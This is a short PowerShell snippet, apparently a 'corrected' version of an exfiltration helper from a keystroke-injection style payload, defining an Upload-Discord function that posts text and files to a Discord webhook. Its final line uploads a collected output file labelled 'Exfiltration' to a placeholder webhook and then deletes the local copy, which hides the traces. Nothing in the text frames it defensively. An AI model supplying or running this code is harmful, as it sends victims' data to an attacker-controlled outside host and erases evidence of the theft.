# Step 1: Define the corrected function (copy and paste this)
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text,
        [parameter(Mandatory=$True)]
        [string]$DiscordUrl
    )

    if ([string]::IsNullOrEmpty($text) -and [string]::IsNullOrEmpty($file)) {
        Write-Error "Either 'text' or 'file' parameter must be provided"
        return
    }

    try {
        if (-not ([string]::IsNullOrEmpty($text))) {
            $Body = @{
                'username' = $env:USERNAME
                'content' = $text
            }
            
            Invoke-RestMethod -ContentType 'application/json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
            Write-Host "Text message sent successfully"
        }

        if (-not ([string]::IsNullOrEmpty($file))) {
            if (Test-Path $file) {
                curl.exe -F "file1=@$file" $DiscordUrl
                Write-Host "File uploaded successfully"
            } else {
                Write-Error "File not found: $file"
            }
        }
    }
    catch {
        Write-Error "Failed to send to Discord: $($_.Exception.Message)"
    }
}

# Step 2: Use this command (replace YOUR_WEBHOOK_URL with your actual webhook)
Upload-Discord -file "$dir\output.txt" -text "Exfiltration" -DiscordUrl "YOUR_WEBHOOK_URL"; Remove-Item "$dir\output.txt"
